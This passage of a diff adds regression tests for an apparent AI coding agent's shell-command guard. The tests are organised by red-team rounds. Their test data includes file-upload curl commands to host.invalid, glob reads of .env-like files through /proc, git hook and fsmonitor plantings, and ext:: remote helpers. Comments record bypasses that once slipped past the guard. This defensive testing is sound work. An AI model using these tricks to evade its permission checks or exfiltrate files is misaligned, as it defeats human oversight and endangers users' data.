+      } finally {
+        process.env.PATH = was;
+        fs.rmSync(link, { force: true });
+      }
+    });
+  });
+
+  describe("B10-2: a URL that names a helper, wherever git takes it", () => {
+    const HELPER = /git-remote-|a transport of git's which runs a program/;
+    test("r4 B10-2: a URL on git's command line whose scheme is not git's own, or <helper>::, goes to the model after a write", async () => {
+      const f = one();
+      await b8After(f, B9_EDIT, [
+        "git ls-remote foo://x/y", "git fetch foo://x/y", "git fetch --dry-run foo://x/y", "git ls-remote --heads foo://x/y", "git ls-remote 'foo://x/y' main", "git ls-remote -- foo://x", "git ls-remote --exit-code foo://x",
+        "git ls-remote FOO://x", "git ls-remote HTTPS://example.invalid/x.git", "git ls-remote foo::x", "git fetch foo::x main", "git fetch ext::x", "git fetch origin foo://x/y",
+      ], "classify", HELPER);
+      // Off the safe list after a write already, or asked by the rules: the same either way.
+      await b8After(f, B9_EDIT, ["git pull foo://x/y main", "git clone foo://x/y d", "git submodule add foo://x/y d", "git archive --remote=foo://x/y HEAD", "git push --dry-run foo://x/y main", "git push --repo=foo://x/y"], ["classify", "ask"]);
+      // A remote of the configuration, git's own schemes, a local path: as before.
+      await b8After(f, B9_EDIT, ["git ls-remote origin", "git fetch origin", "git fetch", "git ls-remote ../b10-none.git", "git ls-remote file:///b10-none.git"], "allow");
+    });
+    test("r4 B10-2: remote add and set-url with such a URL", async () => {
+      const f = one();
+      await b8After(f, B9_EDIT, ["git remote add n foo://x", "git remote set-url origin foo://x", "git remote add n bar::x"], ["classify", "ask"]);
+    });
+    test("r4 B10-2: the keys whose value git takes as a remote name or a URL", async () => {
+      for (const key of ["branch.main.remote", "branch.main.pushRemote", "remote.pushDefault", "checkout.defaultRemote"]) {
+        const f = b10Fixture();
+        for (const value of ["foo://x/y", "FOO://x/y", "foo::x"]) {
+          f.g("config", key, value);
+          await b8After(f, B9_EDIT, ["git fetch", "git status", "git ls-remote"], "classify", /scheme foo|scheme FOO|transport of git's/);
+        }
+        for (const value of ["origin", ".", "https://example.invalid/x.git"]) {
+          f.g("config", key, value);
+          await b8After(f, B9_EDIT, ["git status"], "allow");
+        }
+        fs.rmSync(f.dir, { recursive: true, force: true });
+      }
+    });
+    test("r4 B10-2: a URL with blanks around it is read without them (helperScheme's trim)", async () => {
+      const f = b10Fixture();
+      f.g("config", "remote.b10.url", " foo://h/x ");
+      await b8After(f, B9_EDIT, ["git status"], "classify", /scheme foo/);
+      f.g("config", "remote.b10.url", "\tbar::x");
+      await b8After(f, B9_EDIT, ["git status"], "classify", /transport of git's/);
+    });
+    test("r4 B10-2: a write only into a temp directory counts for what git's configuration names", async () => {
+      const f = b10Fixture();
+      // Nothing in the configuration names a program: as before.
+      await b10AfterTemp(f, ["git status", "git fetch", "git commit -m x"], "allow");
+      f.g("config", "remote.origin.url", "foo://x/y");
+      await b10AfterTemp(f, ["git fetch", "git ls-remote origin", "git status"], "classify", /git-remote-foo/);
+      f.g("config", "remote.origin.url", `${f.dir}.git`);
+      f.file(".git/hooks/pre-commit", "#!/bin/sh\n. /tmp/b10-nowhere.sh\n", 0o755);
+      await b10AfterTemp(f, ["git commit -m x"], "classify", /pre-commit/);
+      await b10AfterTemp(f, ["git status", "cat f", "ls"], "allow");
+    });
+  });
+
+  describe("B10-3: unzip's -P, -O and -I take a value", () => {
+    for (const c of ["unzip -Ptop a.zip", "unzip -Psecret a.zip", "unzip -Pletmein -d .git/hooks a.zip", "unzip -Ocp437 a.zip", "unzip -Ilatin1 a.zip", "unzip -oPpass -d lib a.zip", "unzip -Pl a.zip", "unzip -P l a.zip", "unzip -O l a.zip", "unzip -qPtop a.zip AGENTS.md"]) test(`r4 B10-3: writes what the archive names: ${JSON.stringify(c)}`, () => {
+      assert.match(b9Unseen(c) ?? "", /named inside/, c);
+    });
+    for (const c of ["unzip -l -Ptop a.zip", "unzip -Ptop -l a.zip", "unzip -lPx a.zip", "unzip -tPsecret a.zip", "unzip -Ocp437 -l a.zip"]) test(`r4 B10-3: writes nothing: ${JSON.stringify(c)}`, () => {
+      assert.equal(b9Unseen(c), undefined, c);
+    });
+    b7Each("B10-3", "classify", ["unzip -Ptop a.zip && ./run.sh", "unzip -Psecret a.zip && ./run.sh", "unzip -Ocp437 a.zip && ./run.sh", "unzip -o -Pinfected a.zip && ./run.sh"], one, (reason) => assert.match(reason, /cannot list/));
+    b7Each("B10-3", "ask", ["unzip -Pletmein -d .git/hooks a.zip", "unzip -Ptop a.zip -d .git/hooks", "unzip -Ocp437 -d.git/hooks a.zip"], one);
+    test("r4 B10-3: the place is still -d's, not the password's", () => {
+      assert.deepEqual((guardModule as any).unzipWords(["-Pd/tmp/x", "a.zip"]), { writes: true });
+      assert.deepEqual((guardModule as any).unzipWords(["-P", "-dx", "-d", "lib", "a.zip"]), { writes: true, dir: "lib" });
+    });
+  });
+
+  describe("B10-4: hook flags are not taken from an option's value", () => {
+    const runs = (sub: string, ...rest: string[]) => new Set((decideModule as any).gitHooksRun(sub, rest) as string[]);
+    test("r4 B10-4: commit, merge, pull, am and push read their valued options first", () => {
+      for (const rest of [["-F", "--no-verify"], ["--file", "--no-verify"], ["-aF", "--no-verify"], ["-t", "--no-verify", "-m", "x"], ["--template", "--no-verify", "-m", "x"], ["--trailer", "--no-verify", "-m", "x"], ["-F", "-n"], ["-c", "--no-verify"], ["-C", "-n"], ["--author", "-n", "-m", "x"], ["--fixup", "--no-verify"], ["--pathspec-from-file", "--no-verify"], ["--b10-no-such", "--no-verify", "-m", "x"]]) {
+        assert.ok(runs("commit", ...rest).has("pre-commit"), rest.join(" "));
+      }
+      for (const rest of [["-n", "-m", "x"], ["--no-verify", "-m", "x"], ["-anm", "x"], ["-m", "x", "--no-verify"], ["-F", "msg", "-n"]]) assert.ok(!runs("commit", ...rest).has("pre-commit"), rest.join(" "));
+      assert.ok(runs("merge", "-m", "--no-verify", "x").has("pre-merge-commit"));
+      assert.ok(runs("merge", "-F", "--no-verify", "x").has("pre-merge-commit"));
+      assert.ok(runs("merge", "-s", "--no-verify", "x").has("pre-merge-commit"));
+      assert.ok(!runs("merge", "--no-verify", "x").has("pre-merge-commit"));
+      assert.ok(runs("pull", "-X", "--no-verify").has("pre-merge-commit"));
+      assert.ok(!runs("pull", "--no-verify").has("pre-merge-commit"));
+      assert.ok(runs("am", "--directory", "--no-verify", "x.patch").has("pre-applypatch"));
+      assert.ok(runs("am", "-p", "-n", "x.patch").has("pre-applypatch"));
+      assert.ok(!runs("am", "-n", "x.patch").has("pre-applypatch"));
+      assert.ok(runs("push", "-o", "--no-verify", "origin").has("pre-push"));
+      assert.ok(runs("push", "--repo", "--no-verify").has("pre-push"));
+      assert.ok(!runs("push", "--no-verify", "origin").has("pre-push"));
+    });
+    test("r4 B10-4: git stash that checks out runs post-checkout; git remote update starts gc --auto", () => {
+      for (const rest of [["-k"], ["push", "-k"], ["--keep-index"], ["push", "--keep-index"], ["-k", "-u"], ["-ku"], ["save", "-k"], ["branch", "sb"], ["-p"], ["push", "--patch"], ["--keep"]]) assert.ok(runs("stash", ...rest).has("post-checkout"), rest.join(" "));
+      for (const rest of [[], ["push"], ["pop"], ["apply"], ["list"], ["push", "--no-keep-index"], ["-u"]]) assert.ok(!runs("stash", ...rest).has("post-checkout"), rest.join(" "));
+      assert.ok(runs("remote", "update").has("pre-auto-gc"));
+      assert.ok(runs("remote", "add", "-f", "n", "../x.git").has("pre-auto-gc"));
+      assert.ok(!runs("remote", "-v").has("pre-auto-gc"));
+      assert.ok(runs("maintenance", "run", "--auto").has("pre-auto-gc"));
+      assert.ok(runs("sparse-checkout", "set", "src").has("post-index-change"));
+      assert.ok(runs("checkout-index", "-a").has("post-index-change"));
+      assert.ok(runs("submodule", "update").has("post-checkout"));
+      assert.ok(runs("submodule", "update").has("reference-transaction") && runs("submodule", "update").has("post-index-change"));
+    });
+    test("r4 B10-4: after a write, with a pre-commit hook, an option's value is no --no-verify", async () => {
+      const f = b10Fixture();
+      f.file(".git/hooks/pre-commit", "#!/bin/sh\n. ./helper.sh\n", 0o755);
+      await b8After(f, B9_EDIT, ["git commit -F --no-verify", "git commit -F -n", "git commit --file --no-verify", "git commit -aF --no-verify", "git commit -t --no-verify -m x", "git commit --template --no-verify -m x", "git commit --trailer --no-verify -m x"], "classify", /pre-commit/);
+      await b8After(f, B9_EDIT, ["git commit --no-verify -m x", "git commit -n -m x"], "allow");
+    });
+    test("r4 B10-4: after a write, with a post-checkout hook, git stash -k and its kin go to the model", async () => {
+      const f = b10Fixture();
+      f.file(".git/hooks/post-checkout", "#!/bin/sh\n. ./helper.sh\n", 0o755);
+      await b8After(f, B9_EDIT, ["git stash -k", "git stash push -k", "git stash --keep-index", "git stash push --keep-index", "git stash -k -u", "git stash branch sb"], "classify", /post-checkout/);
+      await b8After(f, B9_EDIT, ["git stash list", "git stash show"], "allow");
+    });
+  });
+
+  describe("B10-5: a glob before /proc", () => {
+    b7Each("B10-5", "ask", [
+      "cd src && cat /pro?/self/cwd/../.e*", "cd src && cat /pr[o]c/self/cwd/../.e*", "cd src && cat /?roc/self/cwd/../.e*", "cd src && cat /p*/self/cwd/../.e*", "cd src && cat /proc/sel?/cwd/../.e*",
+      "cd src && cat /dev/f?/../cwd/../.e*", "cd src && cat /de?/fd/../cwd/../.e*",
+      "cd src && cat ../m?link/../.e*", "cd src && cat ../m[y]link/../.e*", "cd src && head -n5 ../myl*/../.e*", "cd src && cp ../m?link/../.e* ../member",
+      "cd src && cat ../p?/self/cwd/../.e*", "cd src && cat ../pr/sel?/cwd/../.e*", "cd src && cat ../p[r]/self/cwd/../.e*", "cat /pro?/self/cwd/.e*",
+      // A bracket bash may or may not match by the locale (a range that runs backwards, one with a
+      // collating symbol): matched. (`cat` of such a word asks by the rules anyway.)
+      "cd src && ls ../m[z-a]link/../", "cd src && wc -l ../m[[.y.]-z]link/../.e*",
+    ], one);
+    b7Each("B10-5", "allow", ["cat /proc/cpuinfo", "ls src/*.c", "cat s?c/main.c", "ls /pro?/cpuinfo", "cd src && cat ../s?b/notes.txt"], one);
+    // An expansion the check does not walk in full (more than 5000 names at one step, braces it
+    // cannot list): the model.
+    test("r4 B10-5: a glob the check does not walk in full goes to the model", async () => {
+      const f = b10Fixture();
+      fs.mkdirSync(path.join(f.dir, "many"));
+      for (let n = 0; n <= 5000; n++) fs.writeFileSync(path.join(f.dir, "many", `f${n}`), "");
+      for (const c of ["ls many/*", "ls -d many/f*/"]) {
+        const r = await b7Kind(f.dir, c);
+        assert.equal(r.kind, "classify", r.reason);
+        assert.match(r.reason, /does not walk in full/);
+      }
+      assert.equal((await b7Kind(f.dir, "ls many/f1*")).kind, "allow");
+      assert.notEqual((await b7Kind(f.dir, "cat {1..60}{1..40}x*")).kind, "allow");
+    });
+  });
+
+  describe("B10-6: zstd's -o and -D in a cluster take the next word", () => {
+    b7Each("B10-6", "ask", [
+      "zstd -oq AGENTS.md f", "zstd -of .git/hooks/pre-commit f", "zstd -d -oq AGENTS.md p.zst", "zstd -dof .git/hooks/pre-commit p.zst", "zstd -Do dict AGENTS.md f", "zstd -oD AGENTS.md dict f",
+      "zstd -fD dict -o AGENTS.md f", "zstd -19o AGENTS.md f", "zstd -T2o AGENTS.md f", "unzstd -oq AGENTS.md p.zst", "zstdmt -of AGENTS.md f", "zstd -o AGENTS.md -f f", "zstd -oAGENTS.md f",
+    ], one);
+    b7Each("B10-6", "allow", ["zstd -f f -o f.zst", "zstd -qfo out.zst f", "zstd -D dict -o out.zst f", "zstd -Do dict out.zst f", "zstd -oq out.zst f"], one);
+    test("r4 B10-6: the output a cluster names is the session's", async () => {
+      const f = one();
+      const s = new SessionState(f.dir);
+      assert.equal((await b7Kind(f.dir, "zstd -oq b10-out.zst f", s)).kind, "allow");
+      assert.ok(s.touched.has(path.join(fs.realpathSync(f.dir), "b10-out.zst")), [...s.touched].join(", "));
+      assert.equal((await b7Kind(f.dir, "zstd -Do dict b10-out2.zst f", s)).kind, "allow");
+      assert.ok(s.touched.has(path.join(fs.realpathSync(f.dir), "b10-out2.zst")), [...s.touched].join(", "));
+      assert.ok(!s.touched.has(path.join(fs.realpathSync(f.dir), "dict")), [...s.touched].join(", "));
+    });
+  });
+
+  describe("B10-7: GIT_CONFIG_COUNT is held like the command scope", () => {
+    test("r4 B10-7: a key given by GIT_CONFIG_COUNT/KEY/VALUE is held to the repository's list", async () => {
+      const f = b10Fixture();
+      await withEnv({ GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "core.fsmonitor", GIT_CONFIG_VALUE_0: "./helper.sh" }, async () => {
+        await b8After(f, B9_EDIT, ["git status", "git diff"], "classify", /fsmonitor/);
+      });
+      await withEnv({ GIT_CONFIG_COUNT: "2", GIT_CONFIG_KEY_0: "status.short", GIT_CONFIG_VALUE_0: "true", GIT_CONFIG_KEY_1: "core.hooksPath", GIT_CONFIG_VALUE_1: "hooks" }, async () => {
+        await b8After(f, B9_EDIT, ["git commit -m x", "git status"], "classify", /hookspath/i);
+      });
+      await withEnv({ GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "remote.origin.url", GIT_CONFIG_VALUE_0: "foo://x/y" }, async () => {
+        await b8After(f, B9_EDIT, ["git fetch"], "classify", /scheme foo/);
+      });
+      // The key as git lists it: section and name lower-cased, the subsection as written.
+      await withEnv({ GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "URL.HTTPS://h/.InsteadOf", GIT_CONFIG_VALUE_0: "https://example.invalid/" }, async () => {
+        await b8After(f, B9_EDIT, ["git status"], "classify", /a URL whose scheme HTTPS is none of git's own/);
+      });
+      // A count git refuses, or a key it lacks: the check cannot read it.
+      for (const vars of [{ GIT_CONFIG_COUNT: "x" }, { GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: undefined }, { GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "status.short", GIT_CONFIG_VALUE_0: undefined }, { GIT_CONFIG_COUNT: "-1" }]) {
+        await withEnv(vars, async () => {
+          await b8After(f, B9_EDIT, ["git status"], "classify", /GIT_CONFIG_COUNT/);
+        });
+      }
+      await withEnv({ GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "status.short", GIT_CONFIG_VALUE_0: "true" }, async () => {
+        await b8After(f, B9_EDIT, ["git status", "git commit -m x"], "allow");
+      });
+      await withEnv({ GIT_CONFIG_COUNT: "0" }, async () => {
+        await b8After(f, B9_EDIT, ["git status"], "allow");
+      });
+    });
+  });
+
+  describe("B10-8: tar's other outputs", () => {
+    b7Each("B10-8", "ask", [
+      "tar -cf b.tar --index-file=AGENTS.md f", "tar -cf b.tar --index-file=.git/config f", "tar -cf b.tar --index-file .git/hooks/pre-commit f", "tar -tf a.tar --index-file=AGENTS.md", "tar -tvf a.tar --index=AGENTS.md",
+      "tar -xf a.tar --ind=AGENTS.md", "tar -t -f a.tar --index-file=.git/config", "tar --list --file a.tar --index-file=AGENTS.md",
+      "tar -cf b.tar -g .git/hooks/post-commit f", "tar -cf b.tar --listed-incremental=AGENTS.md f", "tar -cf b.tar --listed=AGENTS.md f", "tar -cg AGENTS.md -f b.tar f", "tar cgf AGENTS.md b.tar f", "tar -xf a.tar -g AGENTS.md",
+      "tar -cf b.tar --volno-file=AGENTS.md f", "tar -tf a.tar --volno=.git/config", "tar -xf a.tar --volno-file AGENTS.md",
+      "tar -C src -cf ../b.tar --index-file=AGENTS.md main.c", "cd src && tar -cf ../b.tar --index-file=../AGENTS.md main.c", "tar -c --b10-no-such-option --index-file=AGENTS.md -f b.tar f", "tar -t --b10-no-such-option --volno-file=AGENTS.md -f a.tar",
+      "tar -cf b.tar -F ./run.sh f", "tar -cf b.tar --info-script=./run.sh f", "tar -cf b.tar -L 10 --new-volume-script=./run.sh f",
+    ], one);
+    b7Each("B10-8", "allow", ["tar -cf b.tar --index-file=out.idx f", "tar -cf b.tar -g snap.db f", "tar -tf a.tar", "tar -tvf a.tar --index-file=/dev/null"], one);
+    // (The rules' own: a path outside the working directory is the model's.)
+    b7Each("B10-8", "classify", ["tar -cf b.tar -g /dev/null f"], one);
+    test("r4 B10-8: the index, snapshot and volume files are the session's, placed where tar starts", async () => {
+      const f = one();
+      const top = fs.realpathSync(f.dir);
+      const s = new SessionState(f.dir);
+      for (const [c, file] of [["tar -cf b10.tar --index-file=b10.idx f", "b10.idx"], ["tar -C src -cf b10.tar -g b10.snap main.c", "b10.snap"], ["tar -tf a.tar --volno-file=b10.vol", "b10.vol"]]) {
+        assert.equal((await b7Kind(f.dir, c, s)).kind, "allow", c);
+        assert.ok(s.touched.has(path.join(top, file)), `${c}: ${[...s.touched].join(", ")}`);
+      }
+    });
+  });
+
+  describe("B10-9: an edit the user approves is a session write", () => {
+    test("r4 B10-9: an edit that asks carries its record, and the approval makes it the session's", async () => {
+      const f = b10Fixture();
+      // A protected-looking name in the project (a hook manager's file, opencode's config, a file
+      // in .git): the edit asks, and what it wrote is the project's.
+      for (const [target, then] of [[path.join(f.dir, ".husky", "helper.sh"), "./run.sh"], [path.join(f.dir, ".husky", "helper.sh"), "npm test"], [path.join(f.dir, "opencode.json"), "./run.sh"], [path.join(f.dir, ".git", "b10.sh"), "make"]]) {
+        const s = new SessionState(f.dir);
+        const d = decideFile(guard, s, f.dir, target);
+        assert.equal(d?.effect, "ask", target);
+        // Not approved: nothing is recorded.
+        assert.equal(s.files.size, 0);
+        const before = await b7Kind(f.dir, then, s);
+        assert.equal(before.kind, "allow", before.reason);
+        assert.equal(typeof d?.approve, "function", target);
+        d!.approve!();
+        assert.ok([...s.files.keys()].some((k) => k.endsWith(`/${path.basename(path.dirname(target))}/${path.basename(target)}`)), [...s.files.keys()].join(", "));
+        const r = await b7Kind(f.dir, then, s);
+        assert.equal(r.kind, "classify", r.reason);
+      }
+      // Outside the project and the temp directories (an edit there asks): recorded too, and a
+      // script run there names it. (Such a script is the model's in any session.)
+      const out = fs.mkdtempSync(path.join(os.homedir(), "b10-outside-"));
+      try {
+        fs.writeFileSync(path.join(out, "run.sh"), "#!/bin/sh\n. ./lib.sh\n", { mode: 0o755 });
+        fs.writeFileSync(path.join(out, "lib.sh"), "echo OLD\n");
+        const s = new SessionState(f.dir);
+        const d = decideFile(guard, s, f.dir, path.join(out, "lib.sh"));
+        assert.equal(d?.effect, "ask");
+        assert.doesNotMatch((await b7Kind(f.dir, `sh ${out}/run.sh`, s)).reason, /wrote/);
+        assert.equal(typeof d?.approve, "function");
+        d!.approve!();
+        assert.ok(s.files.has(path.join(fs.realpathSync(out), "lib.sh")), [...s.files.keys()].join(", "));
+        const r = await b7Kind(f.dir, `sh ${out}/run.sh`, s);
+        assert.equal(r.kind, "classify", r.reason);
+        assert.match(r.reason, /wrote \S*lib\.sh/);
+      } finally {
+        fs.rmSync(out, { recursive: true, force: true });
+      }
+    });
+  });
+
+  describe("B10-10: the small points", () => {
+    b7Each("B10-10", "ask", ["zip -OAGENTS.md a.zip f", "zip -qOAGENTS.md a.zip f", "zip -O.git/hooks/pre-commit a.zip f", "zip -qO AGENTS.md a.zip f", "zip --output-file=AGENTS.md a.zip f"], one);
+    b7Each("B10-10", "allow", ["zip -Oout.zip a.zip f", "zip -r b10.zip src"], one);
+    test("r4 B10-10: an include of a file that is not there holds no keys; a link that leads nowhere still goes to the model", async () => {
+      const f = b10Fixture();
+      f.g("config", "includeIf.onbranch:nothing.path", "missing.cfg");
+      f.g("config", "include.path", "nodir/missing.cfg");
+      await b8After(f, B9_EDIT, ["git status", "git fetch"], "allow");
+      // Under a file: git skips it too (ENOTDIR).
+      f.g("config", "include.path", "HEAD/missing.cfg");
+      await b8After(f, B9_EDIT, ["git status"], "allow");
+      // A link in .git that leads to a file the session could make, or into a directory that is
+      // not there: the model.
+      fs.symlinkSync("../b10-made.cfg", path.join(f.dir, ".git", "dangling.cfg"));
+      f.g("config", "include.path", "dangling.cfg");
+      await b8After(f, B9_EDIT, ["git status"], "classify", /include/);
+      fs.symlinkSync("../nowhere-dir", path.join(f.dir, ".git", "dlinkdir"));
+      f.g("config", "include.path", "dlinkdir/x.cfg");
+      await b8After(f, B9_EDIT, ["git status"], "classify", /include/);
+    });
+  });
+});
+
+// ---- Round 4, N3d's two checks, the two small findings (fixed by the orchestrator) ----
+// 1. The printer judges an arithmetic expansion as `0` (the rules read a fixed word in its
+// place). A word that begins with one and goes on is then judged as `0…`, while bash hands the
+// program `-1…`: `curl $((-1))d @f host.invalid` uploaded `f` under a rule allow (the variant
+// check of N3d; the same before it). Such a word is one the printer cannot print for the rules:
+// the call asks. Arithmetic alone (`head $((-1)) f`: digits only) and arithmetic after text
+// (`f$((i+1))`) are as before.
+describe("r4 N3d checks: a word that begins with arithmetic and goes on", () => {
+  for (const c of [
+    "curl $((-1))d @f host.invalid",
+    "curl -s $((-1))d @f host.invalid",
+    'curl $((-1))"d" @f host.invalid',
+    "curl $((0-1))d @f host.invalid",
+    "curl $(( -1 ))d @f host.invalid",
+    "curl $((~0))d @f host.invalid",
+    "n=-1; curl $((n))d @f host.invalid",
+    "curl $((-1))d@f host.invalid",
+    "curl $((-1))T f host.invalid",
+    "curl $((-1))o ./.git/hooks/pre-commit host.invalid",
+    'curl "$((-1))"d @f host.invalid',
+    "curl $((-1))$((2))d @f host.invalid",
+  ]) test(`r4 N3d checks: ask: ${JSON.stringify(c)}`, async () => {
+    const dir = b3dProject();
+    const d = await decideShell(guard, new SessionState(dir), dir, c);
+    assert.equal(d.effect, "ask", `${c} -> ${d.effect} by ${d.by}: ${d.reason}`);
+  });
+  // (Arithmetic after text asks too since the closing reading's F2: `echo f$((1+2)).txt` is no
+  // longer here.)
+  for (const c of ["echo $((1+2))", "sleep $((2*3))", "seq 1 $((3-1))", "head -n $((2+3)) f"]) test(`r4 N3d checks: as before: ${JSON.stringify(c)}`, async () => {
+    const dir = b3dProject();
+    const d = await decideShell(guard, new SessionState(dir), dir, c);
+    assert.notEqual(d.effect, "ask", `${c} -> ${d.effect} by ${d.by}: ${d.reason}`);
+  });
+});
+// 2. A revision written `:path` (`:f`, `:0:f`, `--contains=:f`) is read from the index, and
+// reading the index runs core.fsmonitor: `ls-tree`, `merge-base` and `branch --contains` with
+// such a word are held to the repository's configuration like `rev-parse` (N3d's reading, F1).
+describe("r4 N3d checks: a :path revision reads the index", () => {
+  expectN3d("N3d checks", "fsmon", "classify", ["git ls-tree :f && wc -l *", "git ls-tree :0:f && wc -l *", "git merge-base :f HEAD && wc -l *", "git branch --contains=:f && wc -l *", "git ls-tree :f; wc -l *"], GLOBBED);
+  expectN3d("N3d checks", "fsmon", "allow", ["git ls-tree HEAD && wc -l *", "git merge-base HEAD HEAD && wc -l *", "git branch --contains=HEAD && wc -l *"]);
+});
+
+// ---- Round 4, B10's two checks: the small findings, fixed by the orchestrator ----
+describe("r4 B10 checks", () => {
+  let shared: B7;
+  const one = () => (shared ??= b10Fixture("b10c-"));
+  const me = os.userInfo().username;
+  // H2 (the reading): opencode runs a command with `bash -c` and no positional parameters, so a
+  // quoted `"$@"` (or an empty array's `"${a[@]}"`) is no word at all: git takes the next word as
+  // the option's value, and a `--no-verify` there is no flag. A word with an expansion among a hook
+  // command's own words makes every hook count.
+  test("r4 B10 checks H2: an expansion that may be no word moves --no-verify into a value: the hook counts", async () => {
+    const f = b10Fixture("b10c-h2-");
+    f.file(".git/hooks/pre-commit", "#!/bin/sh\n. ./helper.sh\n", 0o755);
+    await b8After(f, B9_EDIT, ['git commit -m "$@" --no-verify', 'git commit -m x --trailer "$@" --no-verify', 'git commit --trailer "$@" -n -m x', 'git commit -m x --trailer "${a[@]}" --no-verify'], ["classify", "ask"]);
+    await b8After(f, B9_EDIT, ["git commit --no-verify -m x"], "allow");
+  });
+  // G2 (the reading): a word that begins with `~user` is a home bash looks up and the check does
+  // not; with a glob in it, it goes to the model.
+  b7Each("B10 checks G2", ["classify", "ask"], ["cd src && cat ~daemon/../../proc/self/cwd/../.e*", "cat ~sys/f?/../cwd/../.e*", `cat ~${me}/.npmr?`, `head ~${me}/.bash_histor?`], one);
+  b7Each("B10 checks G2", "allow", ["cat ~/notes.txt", "ls ~"], one);
+  // Z2 (the reading): `zstd --trace FILE` writes FILE.
+  b7Each("B10 checks Z2", "ask", ["zstd --trace AGENTS.md in", "zstd --trace .git/hooks/pre-commit in", "zstd --trace=AGENTS.md in"], one);
+  // The variant check's surviving mutations of B10-7: a count that is no plain number, and one
+// over the bound, each with entries that would otherwise read clean.
+test("r4 B10 checks: GIT_CONFIG_COUNT that is no plain number, or over 1000, is a configuration the check cannot read", async () => {
+  const f = b10Fixture("b10c-count-");
+  await withEnv({ GIT_CONFIG_COUNT: "1x", GIT_CONFIG_KEY_0: "status.short", GIT_CONFIG_VALUE_0: "true" }, async () => {
+    await b8After(f, B9_EDIT, ["git status"], "classify", /GIT_CONFIG_COUNT/);
+  });
+  const many: Record<string, string> = { GIT_CONFIG_COUNT: "1001" };
+  for (let n = 0; n < 1001; n++) Object.assign(many, { [`GIT_CONFIG_KEY_${n}`]: "status.short", [`GIT_CONFIG_VALUE_${n}`]: "true" });
+  await withEnv(many, async () => {
+    await b8After(f, B9_EDIT, ["git status"], "classify", /GIT_CONFIG_COUNT/);
+  });
+});
+// F10-1 (the variant check): an approved edit of a file the rules ask about by name (AGENTS.md,
+  // CLAUDE.md) is recorded as a session write like any other approved edit.
+  test("r4 B10 checks F10-1: an approved edit of AGENTS.md is a session write", async () => {
+    const f = b10Fixture("b10c-f101-");
+    f.file("run2.sh", "#!/bin/sh\n. ./AGENTS.md\n", 0o755);
+    f.g("add", "-A");
+    f.g("commit", "-qm", "run2");
+    for (const name of ["AGENTS.md", "CLAUDE.md", "sub/AGENTS.md"]) {
+      const s = new SessionState(f.dir);
+      const d = decideFile(guard, s, f.dir, path.join(f.dir, name));
+      assert.equal(d.effect, "ask", `${name}: ${d.reason}`);
+      d.approve?.();
+      const r = await b7Kind(f.dir, "./run2.sh", s);
+      assert.ok(["classify", "ask"].includes(r.kind), `${name}: ${r.kind} ${r.reason}`);
+    }
+  });
+  // F10-2 (the variant check): after a write into a temp directory only, a git command off the safe
+  // list runs what the repository's configuration names there (a hooks path, an ssh command): it
+  // counts as it does for the safe list.
+  test("r4 B10 checks F10-2: after a temp-only write, git off the safe list with a configured program", async () => {
+    const f = b10Fixture("b10c-f102-");
+    f.g("branch", "topic");
+    f.g("config", "core.hooksPath", path.join(tmp, "b10c-hk"));
+    await b10AfterTemp(f, ["git merge topic", "git rebase topic", "git cherry-pick topic"], ["classify", "ask"]);
+    f.g("config", "--unset", "core.hooksPath");
+    f.g("config", "core.sshCommand", path.join(tmp, "b10c-ssh.sh"));
+    await b10AfterTemp(f, ["git merge topic"], ["classify", "ask"]);
+    f.g("config", "--unset", "core.sshCommand");
+    await b10AfterTemp(f, ["git merge topic"], "allow");
+  });
+});
+
+// The closing reading (step 7, F4): zstd takes a long option by its leading text
+// (`--output-dir-flatx DIR` is `--output-dir-flat DIR`, `--tracex FILE` is `--trace FILE`: zstd
+// 1.5.7's longCommandWArg; tried). Its writes are read so.
+describe("r4 step 7: zstd's long options by their leading text", () => {
+  let shared: B7;
+  const one = () => (shared ??= b10Fixture("s7-zstd-"));
+  b7Each("step 7 F4", "ask", ["zstd -q -d --output-dir-flatx .git/hooks in", "zstd -q --tracex .git/hooks/pre-commit in", "zstd -q --output-dir-mirrorx .git in", "zstd -q --tracex=AGENTS.md in", "zstd -q --output-dir-flat=.git/hooks in"], one);
+  b7Each("step 7 F4", "allow", ["zstd -q -f in -o in.zst", "zstd -q --output-dir-flat out in"], one);
+});
+
+// The closing reading (step 7, F5): a PATH entry inside allowedPaths or sandboxWritable is one the
+// session can write (the sandbox lets it), so after a write the safe list is off there too.
+describe("r4 step 7: a PATH entry in allowedPaths or sandboxWritable is writable", () => {
+  test("r4 step 7 F5: a planted ls in such a PATH entry is not a rule allow after a write", async () => {
+    const f = b10Fixture("s7-f5-");
+    // (Outside the project and the temp directories: the test home is a throwaway one.)
+    const tools = fs.mkdtempSync(path.join(os.homedir(), "s7-f5-tools-"));
+    fs.mkdirSync(path.join(tools, "bin"));
+    const was = process.env.PATH;
+    for (const g of [{ ...guard, allowedPaths: [tools] }, { ...guard, writable: [tools] } as Guard]) {
+      process.env.PATH = `${tools}/bin:${was}`;
+      try {
+        const s = new SessionState(f.dir);
+        const w = await decideShell(g, s, f.dir, B9_EDIT);
+        assert.equal(w.effect, "allow", w.reason);
+        const d = await decideShell(g, s, f.dir, "ls");
+        assert.notEqual(d.effect, "allow", `${JSON.stringify(Object.keys(g))}: ${d.reason}`);
+        assert.match(d.reason, /PATH holds/);
+      } finally {
+        process.env.PATH = was;
+      }
+    }
+    // A PATH entry in neither: as before.
+    process.env.PATH = `${tools}/bin:${was}`;
+    try {
+      const s = new SessionState(f.dir);
+      await decideShell(guard, s, f.dir, B9_EDIT);
+      assert.equal((await decideShell(guard, s, f.dir, "ls")).effect, "allow");
+    } finally {
+      process.env.PATH = was;
+    }
+  });
+});
+
+// The closing runs (step 7, Sonnet 3): `git rebase -i` asked and its long spellings did not.
+describe("r4 step 7: rebase's interactive and exec forms, every spelling", () => {
+  for (const c of ["git rebase --interactive main", "git rebase --inter main", "git rebase --edit-todo", "git rebase --exec 'make' main", "git rebase --exec=make main", "git pull --rebase=interactive", "git pull --rebase=i", "git difftool --extcmd=x"]) test(`r4 step 7: asks: ${JSON.stringify(c)}`, async () => {
+    const d = await decide(c);
+    assert.equal(d.effect, "ask", `${c} -> ${d.effect}: ${d.reason}`);
+  });
+  for (const c of ["git rebase main", "git pull --rebase", "git pull --rebase=merges"]) test(`r4 step 7: as before: ${JSON.stringify(c)}`, async () => {
+    const before = await decide(c);
